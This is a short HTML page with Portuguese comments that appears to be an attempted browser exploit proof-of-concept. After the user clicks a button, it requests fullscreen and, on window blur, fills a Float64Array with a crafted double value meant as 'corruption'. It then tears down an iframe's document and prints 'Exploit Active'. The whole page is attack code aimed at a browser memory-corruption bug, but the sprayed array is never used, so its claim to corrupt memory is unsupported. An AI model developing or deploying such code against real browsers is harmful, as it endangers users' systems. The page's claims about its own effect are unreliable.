<!DOCTYPE html>
<html>
<body>
    <button onclick="runIsolatedTest()">Run Iframe Teardown</button>
    <div id="container"></div>

    <script>
    function runIsolatedTest() {
        const container = document.getElementById('container');
        // Cria o ambiente isolado
        container.innerHTML = '<iframe id="targetFrame" src="about:blank"></iframe>';
        const frame = document.getElementById('targetFrame');
        
        // Entra em Fullscreen (Gatilho inicial)
        if (document.documentElement.webkitRequestFullscreen) 
            document.documentElement.webkitRequestFullscreen();

        window.onblur = function() {
            // 1. Criar o único Float64Array (Corrupção de 1 objeto)
            const poison = new Float64Array(10);
            poison.fill(2.121995791e-314); 

            // 2. TEARDOWN ISOLADO (Substituindo o document.write da página toda)
            const frameDoc = frame.contentWindow.document;
            frameDoc.open();
            frameDoc.write("<h1>Exploit Active</h1>");
            frameDoc.close();
            
            console.log("Teardown executado apenas no Iframe.");
        };
    }
    </script>
</body>
</html>
